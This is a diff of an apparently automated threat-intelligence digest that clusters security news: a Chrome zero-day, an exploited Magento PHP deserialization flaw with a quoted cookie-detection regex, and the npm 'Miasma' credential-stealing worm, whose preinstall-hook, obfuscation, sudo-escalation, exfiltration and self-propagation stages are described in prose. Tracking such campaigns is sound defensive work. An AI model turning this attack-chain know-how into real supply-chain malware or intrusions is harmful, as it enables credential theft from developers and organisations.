+  - cve_ids: CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
+  - urgency_signals: actively_exploited, zero_day, no_patch_yet
+- Cluster IDs: 9aa815a49a, 4faddc63ad, 5da6b03ed1, 6a15521eed
+- Links:
+  - https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
+  - https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html
+  - https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
+  - https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/
 
 ### Cisco active exploitation
 - Anchor signal: Cisco
@@ -660,7 +666,7 @@
 - Anchor signal: Apple iOS/macOS
 - Theme key: apple-ios-macos
 - Cluster count: 2
-- Article count: 10
+- Article count: 9
 - Cohesion: 0.2
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: (none)
@@ -679,14 +685,13 @@
   - https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
   - https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html
   - https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
-  - https://www.securityweek.com/google-patches-5th-chrome-zero-day-exploited-in-2026/
   - https://www.reddit.com/r/AskNetsec/comments/1tyq27j/confirmed_void_dokkaebi_infection_on_macos_how_do/
 
 ### Gogs active exploitation
 - Anchor signal: Gogs
 - Theme key: gogs
 - Cluster count: 3
-- Article count: 4
+- Article count: 6
 - Cohesion: 0.217
 - Shared strong signals: Gogs
 - Member CVEs: (none)
@@ -702,85 +707,72 @@
   - https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
   - https://www.bleepingcomputer.com/news/security/new-veeam-vulnerability-exposes-backup-servers-to-rce-attacks/
 
-### CVE-2026-3910 exploitation activity
-- Anchor signal: CVE-2026-3910
-- Theme key: cve-2026-3910
-- Cluster count: 2
+### Google Cloud vulnerability activity
+- Anchor signal: Google Cloud
+- Theme key: google-cloud
+- Cluster count: 3
 - Article count: 6
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-3910
+- Cohesion: 0.237
+- Shared strong signals: Google Cloud
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: c2bce4cf64, a986419b22
+  - affected_products: Google Cloud, AWS, Azure, Microsoft 365
+- Cluster IDs: 1714548889, 15d2915b57, 1674209ab9
 - Links:
-  - https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
-  - https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html
-  - https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
-  - https://www.securityweek.com/google-patches-5th-chrome-zero-day-exploited-in-2026/
-  - https://www.reddit.com/r/AskNetsec/comments/1tyq27j/confirmed_void_dokkaebi_infection_on_macos_how_do/
-  - https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+  - https://aws.amazon.com/blogs/security/icymi-may-2026-aws-security/
+  - https://www.darkreading.com/cyber-risk/fbi-flagged-phishing-kit-kali365-expands-its-reach
+  - https://thehackernews.com/2026/06/pcpjack-hijacks-230-aws-google-cloud.html
+  - https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/
+  - https://trustedsec.com/blog/how-to-train-your-dragons-analysts
 
-### CVE-2026-11645 exploitation activity
-- Anchor signal: CVE-2026-11645
-- Theme key: cve-2026-11645
+### CVE-2026-42271 exploitation activity
+- Anchor signal: CVE-2026-42271
+- Theme key: cve-2026-42271
 - Cluster count: 2
-- Article count: 6
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-11645
+- Article count: 3
+- Cohesion: 0.2
+- Shared strong signals: CVE-2026-42271
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: c2bce4cf64, a986419b22
+  - cve_ids: CVE-2026-42271, CVE-2026-48710
+  - urgency_signals: preauth_unauth
+- Cluster IDs: 5aa5b8e746, 001d61d9b2
 - Links:
-  - https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
-  - https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html
-  - https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
-  - https://www.securityweek.com/google-patches-5th-chrome-zero-day-exploited-in-2026/
-  - https://www.reddit.com/r/AskNetsec/comments/1tyq27j/confirmed_void_dokkaebi_infection_on_macos_how_do/
-  - https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+  - https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html
+  - https://www.helpnetsecurity.com/2026/06/09/litellm-vulnerability-under-active-attack-cisa-warns-cve-2026-42271/
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
 
-### CVE-2026-3909 exploitation activity
-- Anchor signal: CVE-2026-3909
-- Theme key: cve-2026-3909
+### CVE-2026-48710 exploitation activity
+- Anchor signal: CVE-2026-48710
+- Theme key: cve-2026-48710
 - Cluster count: 2
-- Article count: 6
-- Cohesion: 0.533
-- Shared strong signals: CVE-2026-3909
+- Article count: 3
+- Cohesion: 0.2
+- Shared strong signals: CVE-2026-48710
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: c2bce4cf64, a986419b22
+  - cve_ids: CVE-2026-42271, CVE-2026-48710
+  - urgency_signals: preauth_unauth
+- Cluster IDs: 5aa5b8e746, 001d61d9b2
 - Links:
-  - https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
-  - https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html
-  - https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
-  - https://www.securityweek.com/google-patches-5th-chrome-zero-day-exploited-in-2026/
-  - https://www.reddit.com/r/AskNetsec/comments/1tyq27j/confirmed_void_dokkaebi_infection_on_macos_how_do/
-  - https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+  - https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html
+  - https://www.helpnetsecurity.com/2026/06/09/litellm-vulnerability-under-active-attack-cisa-warns-cve-2026-42271/
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
 
 ## Forward signals
 
 ### Novelty
-- Novel cves: 6
-  - CVE-2026-44180 (first seen via Orca Security Research at 2026-06-09T15:27:41+00:00, cluster 4dd67b47a9)
-  - CVE-2026-44181 (first seen via Orca Security Research at 2026-06-09T15:27:41+00:00, cluster 4dd67b47a9)
-  - CVE-2026-44182 (first seen via Orca Security Research at 2026-06-09T15:27:41+00:00, cluster 4dd67b47a9)
-  - CVE-2024-40711 (first seen via BleepingComputer at 2026-06-09T14:27:56+00:00, cluster a77ea689c1)
-  - CVE-2026-44963 (first seen via BleepingComputer at 2026-06-09T14:27:56+00:00, cluster a77ea689c1)
-  - CVE-2023-38831 (first seen via Dark Reading at 2026-06-09T15:37:02+00:00, cluster 0de77c740f)
+- Novel cves: 4
+  - CVE-2026-45586 (first seen via BleepingComputer at 2026-06-09T17:57:59+00:00, cluster 84e90fe8a7)
+  - CVE-2026-49160 (first seen via BleepingComputer at 2026-06-09T17:57:59+00:00, cluster 84e90fe8a7)
+  - CVE-2026-50507 (first seen via BleepingComputer at 2026-06-09T17:57:59+00:00, cluster 84e90fe8a7)
+  - CVE-2026-45447 (first seen via SecurityWeek at 2026-06-09T16:47:58+00:00, cluster bf85d8cffa)
 - Novel actors: 0
 - Novel products: 1
-  - ChromaDB (first seen via BleepingComputer at 2026-06-09T14:27:56+00:00, cluster a77ea689c1)
+  - Microsoft BitLocker (first seen via BleepingComputer at 2026-06-09T17:57:59+00:00, cluster 84e90fe8a7)
 
 ### Velocity bursts (2)
 - **Massive PyPI Supply Chain Attack Harvests Cloud Credentials via Python Startup Hooks**
@@ -791,7 +783,7 @@
 - **Google patches Chrome zero-day exploited in the wild (CVE-2026-11645)**
   - Cluster: c2bce4cf64
   - Sources in window: 3
-  - Window hours: 5.5
+  - Window hours: 1.7
   - Cohort count: 2
 
 ### Leading edge (0)
@@ -814,11 +806,11 @@
 - Pair: CVE-2026-20128 + Cisco (cluster d0bb0d6217, first observation: True)
 
 ### Drift (2)
-- **TeamPCP** (cluster 25c84fc509)
+- **Cl0p** (cluster 5c65105996)
   - New industries: (none)
-  - New products: PyPI
-  - Prior top industries: financial_services, government
-  - Prior top products: GitHub, Kubernetes, npm
+  - New products: GitHub, Microsoft 365
+  - Prior top industries: financial_services, government, healthcare
+  - Prior top products: Microsoft SharePoint, Palo Alto Networks, SolarWinds
 - **ShinyHunters** (cluster d86e039c0c)
   - New industries: (none)
   - New products: Microsoft Windows, SolarWinds
@@ -843,7 +835,7 @@
 
 ## Clusters
 
-### Cluster b11475fdb0 — score 79
+### Cluster b11475fdb0 — score 78
 
 - Title: Critical Check Point VPN Zero-Day Exploited in the Wild (CVE-2026-50751)
 - Source: Rapid7 (offensive_vulnerability_research)
@@ -946,7 +938,7 @@ CVE-2026-0257 Palo Alto Networks PAN-OS GlobalProtect Authentication Bypass Vuln
   - Summary: CVE-2026-0257 is a critical authentication bypass vulnerability in Palo Alto Networks PAN-OS GlobalProtect that allows unauthorized VPN access and is actively exploited in the wild.
 - **Unit 42** (threat_research_primary)
   - Title: Threat Brief: Active Exploitation of PAN-OS CVE-2026-0257
-  - Published: 2026-06-05T14:05:42+00:00
+  - Published: 2026-06-09T14:05:42+00:00
   - Link: https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
   - Summary: We include indicators of activity and mitigations for PAN-OS vulnerability CVE-2026-0257. The post Threat Brief: Active Exploitation of PAN-OS CVE-2026-0257 appeared first on Unit 42 .
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
@@ -1024,7 +1016,7 @@ Cisco Catalyst SD-WAN Manager CVE-2026-20245 Flaw Actively Exploited – No Patc
   - Link: https://blog.talosintelligence.com/hypotheses-telemetry-and-human-judgment-inside-cisco-talos-threat-hunting/
   - Summary: Learn how Cisco Talos Threat Hunting uses hypothesis-driven methods and multi-domain telemetry correlation to find stealthy threats operating below automated detection thresholds.
 
-### Cluster 5aa5b8e746 — score 33
+### Cluster 5aa5b8e746 — score 32
 
 - Title: LiteLLM Flaw CVE-2026-42271 Exploited in the Wild, Chains to Unauthenticated RCE
 - Source: The Hacker News (cyber_news_breach_reporting)
@@ -1082,8 +1074,8 @@ LiteLLM Flaw CVE-2026-42271 Exploited in the Wild, Chains to Unauthenticated RCE
 - Published: 2026-06-09T11:24:41+00:00
 - Link: https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
 - Fetch status: ok
-- Member count: 5
-- Corroborating source count: 5
+- Member count: 4
+- Corroborating source count: 4
 - Strong signals: Apple iOS/macOS, CVE-2026-11645
 
 #### Cluster taxonomy (union across members)
@@ -1114,7 +1106,7 @@ Google has fixed 74 vulnerabilities in Chrome, including a high-severity zero-da
 Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Google patches Chrome zero-day exploited in the wild (CVE-2026-11645) Google has fixed 74 vulnerabilities in Chrome, including a high-severity zero-day (CVE-2026-11645) that has been exploited in the wild. “Google is aware that an exploit for CVE-2026-11645 exists in the wild,” the company said in a Monday security advisory. The fix has been shipped in Chrome 149.0.7827.102/.103 for Windows and macOS and Chrome 149.0.7827.102 for Linux, with the update rolling out to users over the coming days and weeks. About CVE-2026-11645 CVE-2026-11645 is an out-of-bounds read and write vulnerability in V8, Chrome’s JavaScript engine, that can allow a remote attacker to execute arbitrary code within the browser’s sandbox via a crafted HTML page. Google has not disclosed additional details about the patched zero-day or its in-the-wild exploitation, a standard practice when addressing actively exploited vulnerabilities. “Access to bug details and links may be kept restricted until a majority of users are updated with a fix,” Google noted. “We will also retain restrictions if the bug exists in a third-party library that other projects similarly depend on, but haven’t yet fixed.” The vulnerability was reported to Google on April 27, 2026, by an anonymous researcher who received a $55,000 bug bounty for responsibly disclosing the flaw. CVE-2026-11645 is the fifth Chrome zero-day vulnerability Google has fixed in 2026. Previously patched flaws include CVE-2026-2441 , CVE-2026-3909, CVE-2026-3910, and CVE-2026-5281 . More about 0-day Chrome Google security update Share
 ```
 
-#### Corroborating sources (5)
+#### Corroborating sources (4)
 
 - **Help Net Security** (cyber_news_breach_reporting)
   - Title: Google patches Chrome zero-day exploited in the wild (CVE-2026-11645)
@@ -1131,11 +1123,6 @@ Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Google p
   - Published: 2026-06-09T10:15:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
   - Summary: The flaw, CVE-2026-11645, can allow a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Google Patches 5th Chrome Zero-Day Exploited in 2026
-  - Published: 2026-06-09T05:57:40+00:00
-  - Link: https://www.securityweek.com/google-patches-5th-chrome-zero-day-exploited-in-2026/
-  - Summary: The vulnerability is tracked as CVE-2026-11645 and it was reported in late April by an anonymous researcher. The post Google Patches 5th Chrome Zero-Day Exploited in 2026 appeared first on SecurityWeek .
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - Title: Confirmed Void Dokkaebi infection on macOS — how do I figure out if VS Code Copilot agent was involved in the delivery?
   - Published: 2026-06-06T19:13:13+00:00
@@ -1149,7 +1136,7 @@ Sinisa Markovic , Managing Editor, Help Net Security June 9, 2026 Share Google p
 - Published: 2026-06-05T17:01:48+00:00
 - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-05-06-2026
 - Fetch status: ok
-- Member count: 2
+- Member count: 4
 - Corroborating source count: 2
 - Strong signals: CVE-2026-34197, Gogs, Microsoft Windows
 
@@ -1241,50 +1228,92 @@ Three critical vulnerabilities ( CVE-2026-44182 , CVSS 10.0; CVE-2026-44181 , CV
   - Link: https://orca.security/resources/blog/jupyter-enterprise-gateway-vulnerabilities/
   - Summary: Three critical vulnerabilities (CVE-2026-44182, CVSS 10.0; CVE-2026-44181, CVSS 10.0; CVE-2026-44180, CVSS 9.8) were disclosed affecting Jupyter Enterprise Gateway, a widely used component for remote Jupyter kernel management on Kubernetes clusters, allowing attackers to achieve full remote code execution, create privileged pods, and compromise entire Kubernetes clusters via YAML injection and template injection in the manifest […]
 
-### Cluster 25c84fc509 — score 24
+### Cluster 791da8c978 — score 23
 
-- Title: The npm Threat Landscape: Attack Surface and Mitigations (Updated June 2)
-- Source: Unit 42 (threat_research_primary)
-- Published: 2026-06-02T17:30:33+00:00
-- Link: https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
+- Title: CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-06-03T16:30:00+00:00
+- Link: https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
 - Fetch status: ok
-- Member count: 5
-- Corroborating source count: 5
-- Strong signals: npm
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-45247
 
 #### Cluster taxonomy (union across members)
-- threat_categories: supply_chain
-- actor_attribution: TeamPCP
-- affected_products: GitHub, PyPI, npm
-- content_type: intel_roundup, news_report
-- confidence_tier: tier_1_primary_research, tier_3_analysis, tier_4_news
+- threat_categories: active_exploitation, zero_day
+- affected_industries: government
+- affected_products: GitHub, Linux kernel
+- cve_ids: CVE-2026-11645, CVE-2026-45247
+- urgency_signals: actively_exploited, preauth_unauth, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: supply_chain
-- actor_attribution: TeamPCP
-- affected_products: npm, GitHub
-- content_type: intel_roundup
-- confidence_tier: tier_1_primary_research
+- threat_categories: zero_day, active_exploitation
+- affected_industries: government
+- affected_products: GitHub, Linux kernel
+- cve_ids: CVE-2026-45247, CVE-2026-11645
+- urgency_signals: actively_exploited, zero_day, preauth_unauth
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-Unit 42 analyzes npm supply chain evolution post-Shai Hulud. Discover wormable malware, CI/CD persistence, multi-stage attacks and more. The post The npm Threat Landscape: Attack Surface and Mitigations (Updated June 2) appeared first on Unit 42 .
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted
 ```
 
 #### Full body
 
 ```
-Threat Research Center High Profile Threats Malware Malware The npm Threat Landscape: Attack Surface and Mitigations (Updated June 2) 23 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex Cloud Unit 42 Incident Response By: Unit 42 Published: June 2, 2026 Categories: High Profile Threats Malware Tags: Credential Harvesting GitHub Npm packages Obfuscation Payload Supply chain Worm propagation Share Executive Summary The security of the npm ecosystem reached a critical inflection point in September 2025. The Shai-Hulud worm, a self-replicating malware that automated the compromise and redistribution of malicious packages, marked the end of the “nuisance” era of npm attacks and the beginning of a high-consequence threat landscape. Since that watershed moment, Unit 42 has tracked an aggressive acceleration in the frequency and technical depth of supply chain compromises. Attacks have evolved from a series of isolated typosquatting incidents into systematic campaigns by various threat actors to weaponize the trust that powers modern software development. April 2026 Campaigns We have seen two campaigns in April: the first started April 22, 2026 and included the string Shai-Hulud: The Third Coming . The second started April 29, 2026 and is known as Mini Shai-Hulud . May 2026 Campaigns In May 2026, the Mini Shai-Hulud campaign continued with two new waves attributed to TeamPCP. These campaigns introduced two unique elements. One campaign used a credential-free initial access technique. The other campaign generated the highest single-hour package count of any Shai-Hulud worm to date. Copycat activity has made future attribution to TeamPCP more difficult. June 2026 Campaign A new supply chain attack on June 1, 2026 compromised at least 32 packages published under the @redhat-cloud-services npm namespace. The attacker bypassed code review entirely, pushing a payload named Miasma. The New Baseline for npm Threats The Shai-Hulud incident proved that the npm registry could be used as a force multiplier for malware distribution. In the months following, we have observed three core shifts in adversary TTPs: Wormable propagation: Malicious payloads now prioritize the theft of npm tokens and GitHub Personal Access Tokens (PATs) to automatically infect and republish legitimate packages, as seen in the March 2026 Axios compromise . Infrastructure-level persistence: Attackers are no longer just stealing data; they are embedding themselves into continuous integration/continuous delivery (CI/CD) pipelines to attain long-term, undetectable access to enterprise environments. Multi-stage payloads: Following the September 2025 template, current attacks often deploy dormant “sleeper” dependencies that only activate under specific environmental conditions to evade automated scanners. npm Attacks Seen As a Whole npm compromises have common themes. In the post-Shai-Hulud era, we believe it is helpful to consider the attack surface as a whole. This article will combine: Details of major incidents: Real-time analysis of significant package compromises (e.g., Shai-Hulud 2.0 , Axios , Chalk/Debug ) Cross-campaign correlation: Identifying common infrastructure or code snippets that link disparate attacks to the same threat actors Remediation playbooks: Actionable guidance for rotating credentials and purging malicious dependencies from local and cloud-based caches Shai-Hulud: A New Wave A malicious npm package published as @bitwarden/cli version 2026.4.0 was identified as part of a broader supply-chain campaign attributed to TeamPCP . The package impersonates the legitimate Bitwarden command-line interface (CLI) password manager. Upon installation, it executes a multi-stage payload that steals credentials from cloud providers, CI/CD systems and developer workstations. It then self-propagates by backdooring every npm package the victim can publish. It has been noted that inside public GitHub repo
+CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog  Ravie Lakshmanan  Jun 03, 2026 Web Security / Vulnerability The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted data that could be exploited to execute arbitrary PHP code on an affected server. "Mirasvit Full Page Cache Warmer contains a deserialization of untrusted data vulnerability that could allow unauthenticated attackers to achieve remote code execution by supplying a crafted serialized PHP object in the CacheWarmer cookie," CISA said . The shortcoming impacts all versions of the extension prior to version 1.11.12. Patches for the were released on May 25, 2026. The addition of CVE-2026-45247 to the KEV catalog comes days after Sansec said the PHP object injection vulnerability could be exploited by means of any storefront request carrying a crafted CacheWarmer cookie, which then deserializes part of the cookie value with PHP's native unserialize() function without requiring any authentication or admin privileges. "Because that value comes straight from the client, an attacker controls the objects PHP reconstructs," the Dutch security company said . "This is PHP object injection (CWE-502). Combined with a gadget chain from classes that Magento and its dependencies already ship, object injection escalates to remote code execution." Sansec said it identified about 6,000 stores running Mirasvit extensions, although the exact number is likely to be higher given that content delivery networks (CDNs) like Cloudflare mask installs. Thales-owned Imperva has since disclosed it has observed active attack activity attempting to exploit CVE-2026-45247 through serialized PHP object payloads delivered via malicious HTTP requests. "Observed payloads contain base64-encoded serialized objects designed to trigger PHP Object Deserialization and achieve remote code execution through commonly abused gadget chains," the company said . "The payloads attempt to invoke functions such as system() and current() to execute arbitrary commands on the underlying server. In several observed cases, attackers used test commands designed to validate successful code execution." The activity has primarily singled out gaming and business sites, with the U.S., the U.K., France, and Australia emerging as the most targeted countries. It's currently not known who is behind the exploitation efforts, although the end goal appears to be to flag vulnerable Magento environments and confirm remote code execution is possible. In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies have been ordered to apply the fixes by June 6, 2026. To detect potential exploitation efforts, site owners are advised to audit for storefront requests that carry a CacheWarmer cookie whose value contains the marker "CacheWarmer:" followed by a Base64-encoded string. "Serialized PHP objects base64-encode to values starting with Tz, Qz or YT, so a CacheWarmer cookie value matching CacheWarmer:(Tz|Qz|YT) is a strong indicator of an exploitation attempt," Sansec added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , Imperva , Magento , PHP , remote code execution , Vulnerability , Web Security ⚡ Top Stories This Week Chrome V8 Zero-Day CVE-2026-11645 Exploited in the Wild - Patch Now New FROST Attack Lets Websites Track What Sites and Apps You Open via SSD Timing One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More N
 ```
 
-#### Corroborating sources (5)
+#### Corroborating sources (1)
 
-- **Unit 42** (threat_research_primary)
-  - Title: The npm Threat Landscape: Attack Surface and Mitigations (Updated June 2)
-  - Published: 2026-06-02T17:30:33+00:00
-  - Link: https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
-  - Summary: Unit 42 analyzes npm supply chain evolution post-Shai Hulud. Discover wormable malware, CI/CD persistence, multi-stage attacks and more. The post The npm Threat Landscape: Attack Surface and Mitigations (Updated June 2) appeared first on Unit 42 .
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog
+  - Published: 2026-06-03T16:30:00+00:00
+  - Link: https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
+  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted
+
+### Cluster ac7c9abdf6 — score 23
+
+- Title: Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign
+- Source: Microsoft Security Blog (threat_research_primary)
+- Published: 2026-06-03T04:45:06+00:00
+- Link: https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/
+- Fetch status: ok
+- Member count: 4
+- Corroborating source count: 4
+- Strong signals: npm
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, supply_chain
+- affected_products: GitHub, Kubernetes, PyPI, npm
+- content_type: news_report
+- confidence_tier: tier_1_primary_research, tier_3_analysis, tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, credential_theft
+- affected_products: npm, Kubernetes, GitHub
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+A large-scale npm supply chain attack compromised over 90 versions of @redhat-cloud-services packages, silently infecting CI/CD environments and developer systems. The malicious code steals credentials from GitHub, cloud platforms, and local machines, then spreads like a worm by republishing trusted packages. Discover how the attack works, what data is at risk, and the steps you can take to protect your organization. The post Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign appeared first on Microsoft Security Blog .
+```
+
+#### Full body
+
+```
+Share Link copied to clipboard! Tags Credential theft npm Content types Research Products and services Microsoft Defender Topics Actionable threat insights Defending against advanced tactics Microsoft Threat Intelligence identified a large-scale npm supply chain attack affecting 32 maliciously modified packages across more than 90 versions under the @redhat-cloud-services npm scope. The compromise originated from the upstream RedHatInsights/javascript-clients Continuous Integration and Continuous Delivery (CI/CD) pipeline, allowing attackers to publish trojanized packages through the legitimate GitHub Actions OpenID Connect (OIDC) publishing workflow. As a result, the malicious packages carried authentic provenance signatures while embedding the campaign marker “Miasma: The Spreading Blight.” Once installed, the trojanized packages triggered an npm preinstall hook that executed a heavily obfuscated 4.29 MB dropper script. Through multiple layers of obfuscation and encryption, the malware downloaded the Bun JavaScript runtime and launched a secondary payload designed to harvest credentials from GitHub, npm, Amazon Web Service (AWS), Azure, Google Cloud Platform (GCP), HashiCorp Vault, Kubernetes, and developer systems. The malware also attempted to propagate by compromising additional maintainer packages and, in some scenarios, could destroy the maintainer’s home directory. The payload operated across Linux, macOS, and Windows by dynamically downloading the correct Bun runtime for each platform, although Linux CI/CD runners appeared to be the primary target. On developer systems, the malware stole Secure Shell (SSH) keys, command-line interface (CLI) credentials, browser and wallet data, while in CI/CD environments it scraped GitHub Actions runner memory for secrets, escalated privileges using passwordless sudo, and republished poisoned packages with forged Supply-chain Levels for Software Artifacts (SLSA) provenance to continue downstream propagation. Microsoft shared its findings with the npm team, leading to the removal of affected repositories and the implementation of additional protections on the @redhat-cloud-services namespace to prevent unauthorized publishing. Attack chain overview Figure 1. End-to-end attack chain from the hijacked trusted-publisher flow through credential theft, exfiltration, and worm propagation across maintainers. At a high level, the malware payload progresses through 10 phases: Delivery and execution: The infection begins automatically during npm install, where the malicious preinstall hook executes node index.js without requiring user interaction. Staged unpacking: The payload is unpacked through multiple decoding layers, including several ROT (rotate)-based obfuscation variants followed by AES-128-GCM decryption. The malware then downloads the Bun runtime and detonates the final payload. Environment gating: The malware validates the execution environment before continuing. It terminates execution on systems configured with few regions in locale settings and can optionally restrict execution to CI/CD environments only. Defense evasion: The malware attempts to neutralize security controls Credential access: The malware harvests secrets and authentication tokens from GitHub, npm, major cloud providers, HashiCorp Vault, and Kubernetes environments, including scraping sensitive data directly from CI runner process memory. Privilege escalation : It installs a passwordless sudo rule to obtain elevated privileges and maintain deeper system control. Persistence: The malware continuously monitors stolen tokens and prepares secondary-stage payload deployment for long-term access. Exfiltration: Stolen data is transmitted using three separate command-and-control (C2) channels, including abuse of GitHub infrastructure as an exfiltration mechanism. Self-propagation: The malware republishes packages owned by the compromised maintainer using forged provenance metadata, effectively allowing the threat to spread
+```
+
+#### Corroborating sources (4)
+
 - **Microsoft Security Blog** (threat_research_primary)
   - Title: Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign
   - Published: 2026-06-03T04:45:06+00:00
@@ -1306,62 +1335,13 @@ Threat Research Center High Profile Threats Malware Malware The npm Threat Lands
   - Link: https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html
   - Summary: Multiple software supply chain attacks have hit the npm ecosystem, with threat actors using both malicious and poisoned versions of over 50 legitimate packages to distribute a Rust-based information stealer and a self-spreading worm, respectively. According to JFrog, the information stealer "scrapes every secret it can find on a developer's machine, hides behind an eBPF kernel rootkit, and
 
-### Cluster 791da8c978 — score 23
-
-- Title: CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-06-03T16:30:00+00:00
-- Link: https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-45247
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, supply_chain
-- affected_industries: government
-- affected_products: npm
-- cve_ids: CVE-2024-21182, CVE-2026-45247
-- urgency_signals: actively_exploited, preauth_unauth
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: supply_chain, active_exploitation
-- affected_industries: government
-- affected_products: npm
-- cve_ids: CVE-2026-45247, CVE-2024-21182
-- urgency_signals: actively_exploited, preauth_unauth
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
